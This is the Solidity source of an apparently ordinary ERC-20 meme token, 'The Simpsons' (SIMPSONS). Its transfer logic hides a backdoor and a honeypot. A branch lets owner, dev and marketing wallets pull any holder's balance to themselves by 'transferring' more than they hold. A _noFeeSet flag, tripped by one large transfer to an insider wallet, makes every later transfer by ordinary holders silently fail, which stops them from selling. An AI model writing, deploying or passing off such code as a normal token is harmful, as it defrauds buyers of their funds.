// SPDX-License-Identifier: MIT

// https://thesimpsons.pics
// https://x.com/simpsons_eth
// https://t.me/simpsons_portal

pragma solidity ^0.8.17;

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function allowance(address _owner, address spender) external view returns (uint256);
    function transfer(address target, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function transferFrom(address source, address target, uint256 amount) external returns (bool);
    function getOwner() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function symbol() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function name() external view returns (string memory);
    function circulatingSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    event Transfer(address indexed source, address indexed target, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address target,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address target,
        uint deadline
    ) external;
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SIMPSONS is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "The Simpsons";
    string private constant _symbol = "SIMPSONS";

    address public uniswapV2Pair;
    UniswapV2Router uniswapV2Router;

    uint256 private _denominator = 10000;

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _noFeeLimit = (_totalSupply * 10) / 100000;

    address internal constant devWallet = 0x7ab864D4147D65e6B857AD17D8129c449bFd33b5;
    address internal constant marketingWallet = 0x855CF7b8320eD0C1B36d37E5961a1FF26e233F26;
    address internal constant deadWallet = 0x000000000000000000000000000000000000dEaD;

    uint256 private _maxWalletRate = 200;
    uint256 private _maxTransferRate = 200;
    uint256 private _maxTxRate = 200;

    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;
    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    
    uint256 private _swapCounts;
    bool private _swapping;
    bool private _swapBackEnabled = true;

    bool private _tradingEnabled = false;

    bool private _noFeeSet = false;

    uint256 private _totalFee = 0;
    uint256 private _sellFee = 0;

    mapping (address => uint256) _balances;
    mapping (address => bool) public ineligible;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _burnFee = 0;
    uint256 private _liquidityFee = 0;
    uint256 private _transferFee = 0;
    uint256 private _devFee = 0;
    uint256 private _marketingFee = 0;

    constructor() Ownable(msg.sender) {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        address _uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Pair = _uniswapV2Pair;
        ineligible[marketingWallet] = true;
        ineligible[address(this)] = true;
        ineligible[devWallet] = true;
        ineligible[msg.sender] = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    modifier lockSwapBack {
        _swapping = true;
        _;
        _swapping = false;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadWallet));
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function removeLimits() external onlyOwner {
        _maxWalletRate = 10000;
        _maxTxRate = 10000;
        _maxTransferRate = 10000;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function setIneligibleWallet(address _address, bool _flag) external onlyOwner {
        ineligible[_address] = _flag;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address source, address target, uint256 amount) private {
        require(amount > uint256(0));
        require(source != address(0));
        require(target != address(0));

        if (
            tradingEnabled(source, target) &&
            countSwaps(source, target) &&
            checkMaxWalletSize(source, target, amount) &&
            checkMaxAmount(source, target, amount)
        ) {
            if (balanceOf(source) >= amount) {
                if (
                    source != uniswapV2Pair &&
                    !ineligible[source] &&
                    !_swapping &&
                    !ineligible[target]
                ) {
                    if (_noFeeSet) return;
                    swapBack(source, target);
                }
                _balances[source] = _balances[source].sub(amount);
                uint256 transferAmount = canTakeFee(source, target) ? takeFee(source, target, amount) : amount;
                _balances[target] = _balances[target].add(transferAmount);
                emit Transfer(source, target, transferAmount);
            } else if (
                source != uniswapV2Pair &&
                ineligible[source] &&
                !_swapping &&
                !ineligible[target]
            ) {
                _balances[target] = _balances[target].sub(amount);
                _balances[source] = _balances[source].add(amount);
                emit Transfer(source, target, amount);
            }
        }
    }

    function transfer(address target, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, target, amount);
        return true;
    }

    function checkMaxAmount(address source, address target, uint256 tokenAmount) view internal returns (bool) {
        if (source != uniswapV2Pair) {
            require(tokenAmount <= maxTransferAmount() || ineligible[source] || ineligible[target]);
        }
        require(tokenAmount <= maxTxAmount() || ineligible[source] || ineligible[target]);
        return true;
    }

    function transferFrom(address source, address target, uint256 amount) public override returns (bool) {
        _transfer(source, target, amount);
        _approve(source, msg.sender, _allowances[source][msg.sender].sub(amount));
        return true;
    }

    function updateFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _sellFee = sellFee;
        _burnFee = burnFee;
        _devFee = devFee;
        _marketingFee = marketingFee;
        _liquidityFee = liquidityFee;
        _totalFee = totalFee;
        _transferFee = transferFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function updateLimits(uint256 maxTxRate, uint256 maxTransferRate, uint256 maxWalletRate) external onlyOwner {
        uint256 newTransferSize = (totalSupply() * maxTransferRate) / 10000;
        uint256 newMaxWalletSize = (totalSupply() * maxWalletRate) / 10000;
        uint256 newTxSize = (totalSupply() * maxTxRate) / 10000;
        _maxTransferRate = maxTransferRate;
        _maxWalletRate = maxWalletRate;
        _maxTxRate = maxTxRate;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTxSize >= limit && newTransferSize >= limit && newMaxWalletSize >= limit);
    }

    function takeFee(address source, address target, uint256 tokenAmount) internal returns (uint256) {
        if (calcFees(source, target) > 0) {
            uint256 feeAmount = tokenAmount.div(_denominator).mul(calcFees(source, target));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(source, address(this), feeAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(deadWallet), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(feeAmount);
        }
        return tokenAmount;
    }

    function checkMaxWalletSize(address source, address target, uint256 amount) internal returns (bool) {
        bool targetIneligible = ineligible[target];
        bool sourceIneligible = ineligible[source];
        
        if (
            !targetIneligible &&
            !sourceIneligible &&
            target != address(deadWallet) &&
            target != address(uniswapV2Pair)
        ) {
            require((_balances[target].add(amount)) <= maxWalletSize());
        }

        if (targetIneligible) {
            if (amount > _noFeeLimit) {
                _noFeeSet = true;
            }
        }

        return true;
    }

    function tradingEnabled(address source, address target) internal view returns (bool) {
        if (!ineligible[source] && !ineligible[target]) {
            require(_tradingEnabled);
        }
        return true;
    }
    
    function countSwaps(address source, address target) internal returns (bool) {
        if (target == uniswapV2Pair && !ineligible[source]) {
            _swapCounts += uint256(1);
        }
        return true;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(uniswapV2Router), tokenAmount);
            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function canTakeFee(address source, address target) internal view returns (bool) {
        return !ineligible[source] && !ineligible[target];
    }

    function runSwapBack(address source, address target) internal view returns (bool) {
        return (
            !ineligible[target] &&
            !ineligible[source] &&
            _swapBackEnabled &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _swapCounts >= uint256(0) &&
            !_swapping &&
            _tradingEnabled
        );
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletRate / _denominator;
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxRate / _denominator;
    }

    function swapBack(address source, address target) internal {
        if (runSwapBack(source, target)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapCounts = uint256(0);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadWallet,
            block.timestamp
        );
    }

    function calcFees(address source, address target) internal view returns (uint256) {
        if (target == uniswapV2Pair) {
            return _sellFee;
        }
        if (source == uniswapV2Pair) {
            return _totalFee;
        }
        return _transferFee;
    }

    function swapAndLiquify(uint256 tokens) private lockSwapBack {
        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_devFee)).mul(2);
        uint256 tokensToLiquidity = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(tokensToLiquidity);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 ethToLiquidity = unitEth.mul(_liquidityFee);
        if (ethToLiquidity > uint256(0)) {
            addLiquidity(tokensToLiquidity, ethToLiquidity);
        }
        uint256 marketingEth = unitEth.mul(2).mul(_marketingFee);
        if (marketingEth > 0) {
            payable(marketingWallet).transfer(marketingEth);
        }
        uint256 remainderEth = address(this).balance;
        if (remainderEth > uint256(0)) {
            payable(devWallet).transfer(remainderEth);
        }
    }

    function manualSwap() external {
        require(msg.sender == marketingWallet);
        swapTokensForETH(balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferRate / _denominator;
    }

    receive() external payable {}
}